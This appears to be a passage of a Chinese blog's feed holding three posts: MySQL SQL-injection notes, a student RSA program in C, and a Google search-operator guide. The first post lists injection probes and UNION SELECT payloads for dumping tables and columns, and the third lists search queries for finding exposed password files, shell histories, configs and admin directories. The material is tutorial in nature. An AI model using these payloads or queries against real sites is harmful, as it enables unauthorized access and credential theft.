        <content type="html"><![CDATA[<p>对Mysql显错注入和联合查询进行记录整理</p><span id="more"></span><h2 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理:"></a>SQL注入的原理:</h2><ol><li>用户能够控制传参</li><li>原本程序要执行的代码，拼接了用户输入的内容然后进行执行</li></ol><h2 id="如何判断注入点"><a href="#如何判断注入点" class="headerlink" title="如何判断注入点:"></a>如何判断注入点:</h2><h4 id="最传统做法："><a href="#最传统做法：" class="headerlink" title="最传统做法："></a>最传统做法：</h4><p>  <code>and 1 = 1</code> 显示正常<br>  <code>and 1 = 2</code> 出现错误</p><h4 id="最简单的方法："><a href="#最简单的方法：" class="headerlink" title="最简单的方法："></a>最简单的方法：</h4><p>页面后面加’,看是否报错</p><p> 如果是数字型传参，可以尝试-1 —-&#x2F;&#x2F;+在URL栏代表空格，用的话需要编码<br> 例如：<br> <code>http://www.xxx.com/new.php?id=1</code> 页面显示id&#x3D;1的新闻<br> <code>http://www.xxx.com/new.php?id=2-1</code> 页面显示id&#x3D;1的新闻</p><p> <code>and 1=1</code> <code>and 1=2</code> 被拦截的可能性太高了<br> 可以尝试 <code>and -1=-1</code> <code>and -1=-2</code> <code>and 1&gt;0 or 1=1</code> 或者直接 <code>or sleep(5)</code></p><h2 id="Mysql显错注入-联合查询"><a href="#Mysql显错注入-联合查询" class="headerlink" title="Mysql显错注入-联合查询"></a>Mysql显错注入-联合查询</h2><ul><li><p>使用order by获取字段数</p></li><li><p>使用联合查询获得表名</p><p>  <code>union select 1,2,3</code>（找到回显点，例如回显点在3）<br>  <code>union select 1,2,table_name from information_schema.tables where table_schema = database() limit 0,1</code>(使用limit进行限制)</p></li><li><p>使用联合查询获得字段名<br><code>union select 1,2,column_name from information_schema.columns where table_schema = database() and table_name = &#39;表名&#39;</code>(使用limit进行限制)</p></li><li><p>获取内容<br><code>union select 1,2,字段名 from 表名</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA算法的简易实现</title>
      <link href="/2020/04/18/rsa-suan-fa-de-jian-yi-shi-xian/"/>
      <url>/2020/04/18/rsa-suan-fa-de-jian-yi-shi-xian/</url>
      
        <content type="html"><![CDATA[<p>​C语言程序设计综合实验课程布置了关于RSA算法实现的作业，查了查算法实现思想，特此记录。</p><span id="more"></span><p>RSA算法的描述</p><p>1、选取长度相等的两个大素数p和q，计算其乘积：<br>$$<br>n &#x3D; p*q<br>$$<br>然后随机选取加密密钥e，使e和(p–1)(q–1)互素。<br>最后用欧几里德扩展算法计算解密密钥d，以满足<br>$$<br>ed &#x3D; 1(mod(p – 1)(q – 1))<br>$$</p><p>$$<br>&#x3D;&gt;d &#x3D; e–1 mod((p – 1)(q – 1))<br>$$</p><p>e和n是公钥，d是私钥</p><p>2、加密公式如下：<br>$$<br> ci &#x3D; mi^e（mod n）<br>$$<br>3、解密时，取每一密文分组 ci 并计算：<br>$$<br>mi &#x3D; ci^d（mod n）<br>$$</p><p>$$<br>Ci^d &#x3D;（mi^e）^d &#x3D; mi^{ed} &#x3D; mi^{k（p–1）（q–1）+1}<br>$$</p><p>4、消息也可以用d加密用e解密</p><p>代码如下：</p><pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;**********************************A simple implementation of RSA algorithmCreate by  topK on 2020&#x2F;4&#x2F;18blog: topkli.com **********************************&#x2F;#include&lt;bits&#x2F;stdc++.h&gt;#define ll long longusing namespace std;char buffer[1024];const int MAX_DIGITS &#x3D; 50;ll *encrypted;char *decrypted;struct public_key&#123;ll modulus;ll exponent;&#125;pub;struct private_key&#123;ll modulus;ll exponent;&#125;priv;&#x2F;&#x2F;-----------------------rsa_gen_keys---------------------------ll gcd(ll a, ll b)&#123;  ll c;  while ( a !&#x3D; 0 )  &#123;    c &#x3D; a; a &#x3D; b%a;  b &#x3D; c;  &#125;  return b;&#125;ll ExtEuclid(ll a, ll b)&#123; ll x &#x3D; 0, y &#x3D; 1, u &#x3D; 1, v &#x3D; 0, gcd &#x3D; b, m, n, q, r; while (a!&#x3D;0)  &#123;   q &#x3D; gcd&#x2F;a; r &#x3D; gcd % a;  m &#x3D; x-u*q; n &#x3D; y-v*q;   gcd &#x3D; a; a &#x3D; r; x &#x3D; u; y &#x3D; v; u &#x3D; m; v &#x3D; n;   &#125;   return y;&#125;void rsa_gen_keys()&#123;FILE *primes_list;if(!(primes_list &#x3D; fopen(&quot;prime_source_file.txt&quot;, &quot;r&quot;)))&#123;fprintf(stderr,&quot;Error reading prime_source_file&quot;);exit(1);&#125;&#x2F;&#x2F;count number of primes in the listll prime_count &#x3D; 0;do&#123;int bytes_read &#x3D; fread(buffer,1,sizeof(buffer)-1,primes_list);buffer[bytes_read] &#x3D; &#39;\0&#39;;for(int i &#x3D; 0; buffer[i]; i++)&#123;if(buffer[i] &#x3D;&#x3D; &#39;\n&#39;)&#123;prime_count++;&#125;&#125;&#125;while(feof(primes_list) &#x3D;&#x3D; 0);&#x2F;&#x2F; choose random primes from the list, store them as p,qll p &#x3D; 0, q &#x3D; 0;ll e &#x3D; 257;ll d &#x3D; 0;char prime_buffer[MAX_DIGITS];ll max &#x3D; 0;ll phi_max &#x3D; 0;srand(time(NULL));do&#123;&#x2F;&#x2F; a and b are the positions of p and q in the listint a &#x3D;  (double)rand() * (prime_count+1) &#x2F; (RAND_MAX+1.0);    int b &#x3D;  (double)rand() * (prime_count+1) &#x2F; (RAND_MAX+1.0);        &#x2F;&#x2F;store a as p    rewind(primes_list);    for(int i &#x3D; 0; i &lt; a+1; i++)    &#123;    fgets(prime_buffer,sizeof(prime_buffer)-1, primes_list);&#125;p &#x3D; atol(prime_buffer);&#x2F;&#x2F;store b as qrewind(primes_list);    for(int i &#x3D; 0; i &lt; b+1; i++)&#123;      for(int j &#x3D; 0; j &lt; MAX_DIGITS; j++)&#123;prime_buffer[j] &#x3D; 0;      &#125;      fgets(prime_buffer,sizeof(prime_buffer)-1, primes_list);    &#125;    q &#x3D; atol(prime_buffer);        max &#x3D; p*q;    phi_max &#x3D; (p-1)*(q-1);&#125;while(!(p &amp;&amp; q) || (p &#x3D;&#x3D; q) || (gcd(phi_max, e) !&#x3D; 1));&#x2F;&#x2F;solve the dd &#x3D; ExtEuclid(phi_max,e);  while(d &lt; 0)&#123;    d &#x3D; d+phi_max;  &#125;    FILE *gen_primes;  if(!(gen_primes &#x3D; fopen(&quot;gen_primes.txt&quot;, &quot;w&quot;)))&#123;fprintf(stderr,&quot;Error write gen_primes&quot;);exit(1);&#125;  fprintf(gen_primes,&quot;primes are %lld and %lld\n&quot;,(ll)p, (ll)q);  fclose(gen_primes);    pub.modulus &#x3D; max;  pub.exponent &#x3D; e;  priv.modulus &#x3D; max;  priv.exponent &#x3D; d;&#125;&#x2F;&#x2F;--------------------------------------------------------------ll rsa_modExp(ll b, ll e, ll m)&#123;  if (b &lt; 0 || e &lt; 0 || m &lt;&#x3D; 0)&#123;    printf(&quot;Too large integer, PLease change other prime\n&quot;); exit(1);  &#125;  b &#x3D; b % m;  if(e &#x3D;&#x3D; 0) return 1;  if(e &#x3D;&#x3D; 1) return b;  if( e % 2 &#x3D;&#x3D; 0)&#123;    return ( rsa_modExp(b * b % m, e&#x2F;2, m) % m );  &#125;  if( e % 2 &#x3D;&#x3D; 1)&#123;    return ( b * rsa_modExp(b, (e-1), m) % m );  &#125;&#125;&#x2F;&#x2F;--------------------------rsa_encrypt-------------------------ll *rsa_encrypt(char *message, const unsigned long message_size)&#123;ll *encrypted &#x3D; (ll*)malloc(sizeof(ll)*message_size);if(encrypted &#x3D;&#x3D; NULL)&#123;    fprintf(stderr, &quot;Error: Heap allocation failed.\n&quot;);    return NULL;  &#125;  long long i &#x3D; 0;  for(int i &#x3D; 0; i &lt; message_size; i++)&#123;    encrypted[i] &#x3D; rsa_modExp(message[i], pub.exponent, pub.modulus);  &#125;  return encrypted;&#125;&#x2F;&#x2F;--------------------------------------------------------------&#x2F;&#x2F;--------------------------rsa_decrypt-------------------------char *rsa_decrypt(ll *message, unsigned long message_size)&#123;if(message_size % sizeof(long long) !&#x3D; 0)&#123;    fprintf(stderr, &quot;Error: message_size is not divisible by %d, so cannot be output of rsa_encrypt\n&quot;, (int)sizeof(long long));     return NULL;  &#125;    &#x2F;&#x2F; We allocate space to do the decryption (temp) and space for the output as a char array  char *decrypted &#x3D; (char*)malloc(message_size&#x2F;sizeof(long long));  char *temp &#x3D; (char*)malloc(message_size);  if((decrypted &#x3D;&#x3D; NULL) || (temp &#x3D;&#x3D; NULL))&#123;    fprintf(stderr, &quot;Error: Heap allocation failed.\n&quot;);    return NULL;  &#125;    &#x2F;&#x2F; Now we go through each 8-byte chunk and decrypt it.  long long i &#x3D; 0;  for(int i &#x3D; 0; i &lt; message_size&#x2F;8; i++)&#123;    temp[i] &#x3D; rsa_modExp(message[i], priv.exponent, priv.modulus);  &#125;  &#x2F;&#x2F; The result should be a number in the char range, which gives back the original byte.  &#x2F;&#x2F; We put that into decrypted, then return.  for(int i &#x3D; 0; i &lt; message_size&#x2F;8; i++)&#123;    decrypted[i] &#x3D; temp[i];  &#125;  free(temp);  return decrypted;&#125; &#x2F;&#x2F;--------------------------------------------------------------int main()&#123;char message[50];long message_size &#x3D; 0;FILE *message_file;FILE *public_key_file;FILE *private_key_file;while(1)&#123;int flag1 &#x3D; -1;printf(&quot;Welcome to the RSA encryption &amp; decryption system!\n&quot;);printf(&quot;The system instruction manual is as follows:\n\n&quot;);printf(&quot;1: Generatethe RSA secret key\n&quot;);printf(&quot;2: Encrypte the message file\n&quot;);printf(&quot;3: Decrypted encrypted text file\n&quot;);printf(&quot;4: Check encrypted file\n&quot;);printf(&quot;5: Check decrypted file\n&quot;); printf(&quot;0: Exit RSA encryption &amp; decryption system\n\n&quot;);printf(&quot;Waiting for input...\n&quot;);scanf(&quot;%d&quot;,&amp;flag1);printf(&quot;\n&quot;);switch(flag1)&#123;case 0:&#123;printf(&quot;Thank you for using RSA encryption &amp; decryption system\n&quot;);break;&#125; case 1:&#123;printf(&quot;Generating the rsa secret key, please wait...\n&quot;);rsa_gen_keys();if(!(public_key_file &#x3D; fopen(&quot;public_key_file.txt&quot;, &quot;w&quot;)))&#123;fprintf(stderr,&quot;Error write public_key_file&quot;);exit(1);&#125;fprintf(public_key_file, &quot;Public Key: Modulus: %lld Exponent: %lld&quot;, pub.modulus, pub.exponent);if(!(private_key_file &#x3D; fopen(&quot;private_key_file.txt&quot;, &quot;w&quot;)))&#123;fprintf(stderr,&quot;Error write private_key_file&quot;);exit(1);&#125;fprintf(private_key_file, &quot;Private Key: Modulus: %lld Exponent: %lld&quot;, priv.modulus, priv.exponent);fclose(public_key_file);fclose(private_key_file);printf(&quot;The rsa secret key was successfully generated!\n&quot;);printf(&quot;The generated primes are in the gen_primes.txt in the current directory.\n&quot;);printf(&quot;The generated public keys are in the public_key_file.txt in the current directory.\n&quot;);printf(&quot;The generated private keys are in the private_key_file.txt in the current directory.\n&quot;);while(1)&#123;int flag2 &#x3D; -1;printf(&quot;\n&quot;);printf(&quot;What would you like to do next?\n&quot;);printf(&quot;1: Check the prime file\n&quot;);printf(&quot;2: Check the public keys file\n&quot;);printf(&quot;3: Check the private keys file\n&quot;);printf(&quot;0: Back to main menu\n&quot;);scanf(&quot;%d&quot;,&amp;flag2);printf(&quot;\n&quot;);switch(flag2)&#123;case 1:&#123;printf(&quot;Reading gen_primes file, please wait...\n&quot;);FILE *gen_primes;ll a,b;  if(!(gen_primes &#x3D; fopen(&quot;gen_primes.txt&quot;, &quot;r&quot;)))&#123;fprintf(stderr,&quot;Error read gen_primes&quot;);exit(1);&#125;  fscanf(gen_primes,&quot;primes are %lld and %lld\n&quot;,&amp;a, &amp;b);  printf(&quot;primes are %lld and %lld\n&quot;, a, b);  fclose(gen_primes);  break;  &#125;     case 2:  &#123;printf(&quot;Reading pubilc_key_file, please wait...\n&quot;);  if(!(public_key_file &#x3D; fopen(&quot;public_key_file.txt&quot;, &quot;r&quot;)))&#123;fprintf(stderr,&quot;Error read public_key_file.txt&quot;);exit(1);&#125;char s;while(fscanf(public_key_file,&quot;%c&quot;,&amp;s) !&#x3D; EOF)printf(&quot;%c&quot;,s);  fclose(public_key_file);  break;  &#125;     case 3: &#123; ll a,b;printf(&quot;Reading private_key_file, please wait...\n&quot;);  if(!(private_key_file &#x3D; fopen(&quot;private_key_file.txt&quot;, &quot;r&quot;)))&#123;fprintf(stderr,&quot;Error read private_key_file.txt&quot;);exit(1);&#125;char s;while(fscanf(private_key_file,&quot;%c&quot;,&amp;s) !&#x3D; EOF)printf(&quot;%c&quot;,s);  fclose(private_key_file);  break;  &#125;     case 0:   &#123;   printf(&quot;Returning to main menu.\n&quot;);break;  &#125;   default:  &#123;   printf(&quot;Invalid input, please try again.&quot;);  break;  &#125;&#125;if(flag2 &#x3D;&#x3D; 0)break;&#125;break; &#125;case 2:&#123;printf(&quot;Loading message file, Please wait.\n&quot;);if(!(message_file &#x3D; fopen(&quot;message_file.txt&quot;, &quot;r&quot;)))&#123;fprintf(stderr,&quot;Error reading message_file&quot;);exit(1);&#125;fscanf(message_file, &quot;%s&quot;, &amp;message);for(int i &#x3D; 0; i &lt; sizeof(message); i++)&#123;if(message[i] !&#x3D; &#39;\0&#39;)&#123;message_size++;&#125;else break;&#125;printf(&quot;Loading success!\n&quot;);encrypted &#x3D; rsa_encrypt(message, message_size);if (!encrypted)&#123;    fprintf(stderr, &quot;Error in encryption!\n&quot;);    return 1;&#125;FILE *encrypted_file;if(!(encrypted_file &#x3D; fopen(&quot;encrypted_file.txt&quot;, &quot;w&quot;)))&#123;fprintf(stderr,&quot;Error write encrypted_file&quot;);exit(1);&#125;for(int i &#x3D; 0; i &lt; strlen(message); i++)fprintf(encrypted_file,&quot;%lld\n&quot;, encrypted[i]);fclose(encrypted_file);printf(&quot;Encryption to complete!\n&quot;);printf(&quot;The encrypted_file is in the encryption_file.txt in the current directory.\n&quot;);printf(&quot;\n&quot;);int flag2 &#x3D; -1;while(1)&#123;printf(&quot;Please input 0 to back to main menu.\n&quot;);scanf(&quot;%d&quot;,&amp;flag2);printf(&quot;\n&quot;);if(flag2 &#x3D;&#x3D; 0)break;else&#123;printf(&quot;Invalid input, please try again.\n&quot;);&#125;&#125;break;&#125;case 3:&#123;&#x2F;&#x2F;open encrypted fileFILE *encrypted_file;if(!(encrypted_file &#x3D; fopen(&quot;encrypted_file.txt&quot;, &quot;r&quot;)))&#123;fprintf(stderr,&quot;Error read encrypted_file&quot;);exit(1);&#125;ll s;ll *encrypted_text;int n &#x3D; 0;while(fscanf(encrypted_file,&quot;%lld&quot;,&amp;s) !&#x3D; EOF)&#123;encrypted_text[n] &#x3D; s;n++;&#125;fclose(encrypted_file);&#x2F;&#x2F;open private fileFILE *private_key_file;if(!(private_key_file &#x3D; fopen(&quot;private_key_file.txt&quot;, &quot;r&quot;)))&#123;fprintf(stderr,&quot;Error read private_key_file.txt&quot;);exit(1);&#125;fscanf(private_key_file,&quot;Private Key: Modulus: %lld Exponent: %lld&quot;,&amp;priv.modulus, &amp;priv.exponent);fclose(private_key_file);&#x2F;&#x2F;open public fileFILE *public_key_file;if(!(public_key_file &#x3D; fopen(&quot;public_key_file.txt&quot;, &quot;r&quot;)))&#123;fprintf(stderr,&quot;Error read public_key_file.txt&quot;);exit(1);&#125;fscanf(public_key_file,&quot;Public Key: Modulus: %lld Exponent: %lld&quot;,&amp;pub.modulus, &amp;pub.exponent);fclose(public_key_file);&#x2F;&#x2F;decrypte encrypted textdecrypted &#x3D; rsa_decrypt(encrypted_text, 8*n);if (!decrypted)&#123;    fprintf(stderr, &quot;Error in decryption!\n&quot;);    return 1;  &#125;  FILE *decrypted_file;  if(!(decrypted_file &#x3D; fopen(&quot;decrypted_file.txt&quot;, &quot;w&quot;)))&#123;fprintf(stderr,&quot;Error write decrypted_file&quot;);exit(1);&#125;  for(int i &#x3D; 0; i &lt; strlen(message); i++)  fprintf(decrypted_file,&quot;%c&quot;,decrypted[i]);  fclose(decrypted_file);  printf(&quot;Decryption to complete!\n&quot;);printf(&quot;The decrypted_file is in the decryption_file.txt in the current directory.\n&quot;);printf(&quot;\n&quot;);int flag2 &#x3D; -1;while(1)&#123;printf(&quot;Please input 0 to back to main menu.\n&quot;);scanf(&quot;%d&quot;,&amp;flag2);printf(&quot;\n&quot;);if(flag2 &#x3D;&#x3D; 0)break;else&#123;printf(&quot;Invalid input, please try again.\n&quot;);&#125;&#125;break;&#125;case 4:&#123;printf(&quot;The encrypted_file is as follows:\n\n&quot;);FILE *encrypted_file;if(!(encrypted_file &#x3D; fopen(&quot;encrypted_file.txt&quot;, &quot;r&quot;)))&#123;fprintf(stderr,&quot;Error read encrypted_file&quot;);exit(1);&#125;ll s;while(fscanf(encrypted_file,&quot;%lld&quot;,&amp;s) !&#x3D; EOF)printf(&quot;%lld &quot;,s);fclose(encrypted_file);printf(&quot;\n\n&quot;);int flag2 &#x3D; -1;while(1)&#123;printf(&quot;Please input 0 to back to main menu.\n&quot;);scanf(&quot;%d&quot;,&amp;flag2);printf(&quot;\n&quot;);if(flag2 &#x3D;&#x3D; 0)break;else&#123;printf(&quot;Invalid input, please try again.\n&quot;);&#125;&#125;break;&#125;case 5:&#123;printf(&quot;The decrypted_file is as follows:\n\n&quot;);FILE *decrypted_file;if(!(decrypted_file &#x3D; fopen(&quot;decrypted_file.txt&quot;,&quot;r&quot;)))&#123;fprintf(stderr,&quot;Error read decrypted_file&quot;);exit(1);&#125;char s;while(fscanf(decrypted_file,&quot;%c&quot;,&amp;s) !&#x3D; EOF)printf(&quot;%c&quot;,s);fclose(decrypted_file);printf(&quot;\n\n&quot;);int flag2 &#x3D; -1;while(1)&#123;printf(&quot;Please input 0 to back to main menu.\n&quot;);scanf(&quot;%d&quot;,&amp;flag2);printf(&quot;\n&quot;);if(flag2 &#x3D;&#x3D; 0)break;else&#123;printf(&quot;Invalid input, please try again.\n&quot;);&#125;&#125;break;break;&#125;default: printf(&quot;Invalid input, please try again.&quot;);break;&#125;if(flag1 &#x3D;&#x3D; 0)break;printf(&quot;\n\n&quot;);&#125;free(encrypted);  free(decrypted);  return 0;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google搜索使用技巧</title>
      <link href="/2020/03/15/google-sou-suo-shi-yong-ji-qiao/"/>
      <url>/2020/03/15/google-sou-suo-shi-yong-ji-qiao/</url>
      
        <content type="html"><![CDATA[<p>​对使用搜索引擎进行搜索时的一些查询指令做了一些总结，以后想不起来就能直接查了。</p><span id="more"></span><hr /><h3>&nbsp;<s>熟练使用搜索引擎&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</s>高级查询指令</h3><p class="MsoNormal"><span lang="EN-US">[ intitle: ]</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">按标题搜索帮助<span lang="EN-US">google</span>限定了你搜索的结果，只有那些标题含有你指定的关键词的页面会返回给你。例如<span lang="EN-US">&ldquo;intitle: login password&rdquo;</span>会返回标题含有<span lang="EN-US">login</span>，而页面里面随便什么地方含有<span lang="EN-US">password</span>的网页给你。当你想在标题里面搜索超过<span lang="EN-US">2</span>个词的时候，你可以使用<span lang="EN-US">&ldquo;allintitle:&rdquo; </span>，当然也可以使用<span lang="EN-US">&ldquo;intitle&rdquo;</span>来代替搜索，<span lang="EN-US">&ldquo;intitle: login intitle: password&rdquo; </span>和<span lang="EN-US">&ldquo;allintitle: login password&rdquo;</span>的搜索结果是一样的。</p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">&nbsp;</p><p class="MsoNormal"><span lang="EN-US">[ inurl: ]</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">按链接搜索返回那些网址<span lang="EN-US">url</span>里面包含你指定关键词的页面。例如<span lang="EN-US">&ldquo;inurl: passwd&rdquo; </span>，返回那些网址<span lang="EN-US">url</span>里面包含你指定关键词<span lang="EN-US">passwd</span>的页面。同上，如果你想在网址里搜索多个关键词，你可以使用<span lang="EN-US">&ldquo;allinurl:&rdquo;</span>语法。例如<span lang="EN-US">&ldquo;allinurl: etc/passwd&ldquo; </span>会搜索网址里含有<span lang="EN-US">etc</span>和<span lang="EN-US">passwd</span>的网页，斜杠<span lang="EN-US">&ldquo;/&rdquo;</span>会被<span lang="EN-US">google</span>忽略。</p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">&nbsp;</p><p class="MsoNormal"><span lang="EN-US">[ site: ]</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">语法&ldquo;<span lang="EN-US">site:&rdquo;</span>只搜索指定网域里的关键词，例如<span lang="EN-US">&ldquo;exploits site:hackingspirits.com&rdquo;</span>将搜索<span lang="EN-US">hackingspirits.com</span>网站上的所有包含<span lang="EN-US">exploits</span>的页面。</p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">&nbsp;</p><p class="MsoNormal"><span lang="EN-US">[ filetype: ]</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">按指定文件类型即后缀搜索（例如<span lang="EN-US">doc</span>、<span lang="EN-US">pdf</span>或<span lang="EN-US">ppt</span>等等）。例如<span lang="EN-US">&ldquo;filetype:doc site:gov confidential&rdquo;</span>将搜索所有<span lang="EN-US">.gov</span>的政府网站上的<span lang="EN-US">.doc</span>文件和含有<span lang="EN-US">confidential</span>关键字的页面，或者是<span lang="EN-US">.doc</span>文件里面含有关键字<span lang="EN-US">confidential</span>的页面，这意味着搜索结果将返回政府网站上所有机密的<span lang="EN-US">.doc</span>文件。</p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">&nbsp;</p><p class="MsoNormal"><span lang="EN-US">[ link: ]</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">按引用搜索将列出所有包含特定链接的页面，例如<span lang="EN-US">&ldquo;link:www.securityfocus.com&rdquo;</span>将列出所有包含指向<span lang="EN-US">Securityfocus</span>主页的网址的页面。</p><p class="MsoNormal"><span lang="EN-US">[ related: ]</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">按相似搜索将列出与指定网页相似的页面，例如&ldquo;<span lang="EN-US">related:www.securityfocus.com&rdquo;</span>将返回与<span lang="EN-US">Securityfocus</span>筑页相似的页面。注意在<span lang="EN-US">&ldquo;related:&rdquo;</span>与网址间不可以有空格。</p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">&nbsp;</p><p class="MsoNormal"><span lang="EN-US">[cache: ]</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">网页快照，<span lang="EN-US">google</span>将返回给你他储存下来的历史页面。如果你同时指定了其他查询词，<span lang="EN-US">google</span>将在搜索结果里以高亮显示。例如查询<span lang="EN-US">&ldquo;cache: www.hackingspirits.com guest&rdquo;</span>在返回的结果里将高亮显示<span lang="EN-US">&rdquo;guest&rdquo;</span>。（受<span lang="EN-US">gfw</span>影响，在大陆应该是用不了的）</p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">&nbsp;</p><p class="MsoNormal"><span lang="EN-US">[ intext: ]</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">&ldquo;<span lang="EN-US">intext:&rdquo;</span>寻找特定网页里的关键字，他不理会网址和文章标标题。例如<span lang="EN-US">&ldquo;intext:exploits&rdquo;</span>将只返回包含指定关键字<span lang="EN-US">&ldquo;exploits&rdquo;</span>的网页的地址。</p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">&nbsp;</p><p class="MsoNormal"><span lang="EN-US">[ phonebook: ]</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">电话簿查询美国街道地址和电话号码信息。例如<span lang="EN-US">&ldquo;phonebookisa+CA&rdquo;</span>将查询名字里面包含<span lang="EN-US">&ldquo;Lisa&rdquo;</span>并住在加州的人的所有名字。这对黑客使用社会工程学去挖掘个人信息是很有用的。</p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">&nbsp;</p><p class="MsoNormal"><span lang="EN-US">[Index of]</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">利用&ldquo;<span lang="EN-US">Index of &rdquo;</span>语法去发现允许目录浏览的<span lang="EN-US">web</span>网站，就象在本地的普通目录一样。下面是一些有趣的查询：</p><p class="MsoNormal"><span lang="EN-US">Index of /admin</span></p><p class="MsoNormal"><span lang="EN-US">Index of /passwd</span></p><p class="MsoNormal"><span lang="EN-US">Index of /password</span></p><p class="MsoNormal"><span lang="EN-US">Index of /mail</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +passwd</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +password.txt</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +.htaccess</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /root&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /cgi-bin&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /logs&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /config&rdquo;</span></p><p class="MsoNormal">（包含引号）</p><p class="MsoNormal"><span lang="EN-US">[</span>利用<span lang="EN-US">&ldquo;inurl:&rdquo;</span>或<span lang="EN-US">&ldquo;allinurl:&rdquo;</span>寻找有漏洞的网站或服务器<span lang="EN-US">]</span></p><p class="MsoNormal"><span lang="EN-US">a</span>、利用<span lang="EN-US">&ldquo;allinurl:winnt/system32/&rdquo;</span>查询：列出的服务器上本来应该受限制的诸如<span lang="EN-US">&ldquo;system32&rdquo;</span>等目录，如果你运气足够好，你会发现<span lang="EN-US">&ldquo;system32&rdquo;</span>目录里的<span lang="EN-US">&ldquo;cmd.exe&rdquo;</span>文件，并能执行他，接下来就是提升权限并攻克了。</p><p class="MsoNormal"><span lang="EN-US">b</span>、查询<span lang="EN-US">&ldquo;allinurl:wwwboard/passwd.txt&rdquo;</span>将列出所有有<span lang="EN-US">&ldquo;WWWBoard Password vulnerability&rdquo;</span>漏洞的服务器，阅读更多请参见下面链接。<span lang="EN-US">http://www.securiteam.com/exploits/2BUQ4S0SAW.html</span></p><p class="MsoNormal"><span lang="EN-US">c</span>、查询<span lang="EN-US">&ldquo;inurl:.bash_history&rdquo;</span>将列出互联网上可以看见<span lang="EN-US">&ldquo;inurl:.bash_history&rdquo;</span>文件的服务器。这是一个命令历史文件，这个文件包含了管理员执行的命令，有时会包含一些敏感信息比如管理员键入的密码。</p><p class="MsoNormal"><span lang="EN-US">d</span>、查询<span lang="EN-US">&ldquo;inurl:config.txt&rdquo;</span>将看见网上暴露了<span lang="EN-US">&ldquo;inurl:config.txt&rdquo;</span>文件的服务器，这个文件包含了经过哈希编码的管理员的密码和数据库存取的关键信息。</p><p class="MsoNormal"><span lang="EN-US">e</span>、还有一些其他一些使用<span lang="EN-US">&ldquo;inurl:&rdquo;</span>和<span lang="EN-US">&ldquo;allinurl:&rdquo;</span>查询组合的例子。</p><p class="MsoNormal"><span lang="EN-US">inurl:admin filetype:txt</span></p><p class="MsoNormal"><span lang="EN-US">inurl:admin filetype:db</span></p><p class="MsoNormal"><span lang="EN-US">inurl:admin filetype:cfg</span></p><p class="MsoNormal"><span lang="EN-US">inurl:mysql filetype:cfg</span></p><p class="MsoNormal"><span lang="EN-US">inurl:passwd filetype:txt</span></p><p class="MsoNormal"><span lang="EN-US">inurl:&rdquo;wwwroot/*.&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:adpassword.txt</span></p><p class="MsoNormal"><span lang="EN-US">inurl:webeditor.php</span></p><p class="MsoNormal"><span lang="EN-US">inurl:file_upload.php</span></p><p class="MsoNormal"><span lang="EN-US">inurl:gov filetype:xls &ldquo;restricted&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">index of ftp +.mdb allinurl:/cgi-bin/ +mailto</span></p><p class="MsoNormal">（以上查询包含引号）</p><p class="MsoNormal"><span lang="EN-US">[</span>利用<span lang="EN-US">&ldquo;intitle:&rdquo;</span>和<span lang="EN-US">&ldquo;allintitle:&rdquo;</span>寻找有漏洞的服务器<span lang="EN-US">]</span></p><p class="MsoNormal"><span lang="EN-US">a</span>、通过<span lang="EN-US">[allintitle: &ldquo;index of /root&rdquo;] </span>查询列出有<span lang="EN-US">&ldquo;root&rdquo;</span>目录存取权限的服务器的列表，这个目录经常包含敏感信息，通过这些信息服务器可能会被轻易攻克。</p><p class="MsoNormal"><span lang="EN-US">b</span>、通过<span lang="EN-US">[allintitle:&ldquo;index of /admin&rdquo;] </span>查询列出有<span lang="EN-US">&ldquo;admin&rdquo;</span>目录列表权限的服务器的，绝大部分<span lang="EN-US">web </span>程序使用<span lang="EN-US">&ldquo;admin&rdquo;</span>用户名去储存管理员权限。这个目录下的敏感信息可能会被利用来轻易地攻克服务器。</p><p class="MsoNormal"><span lang="EN-US">inurl:</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span 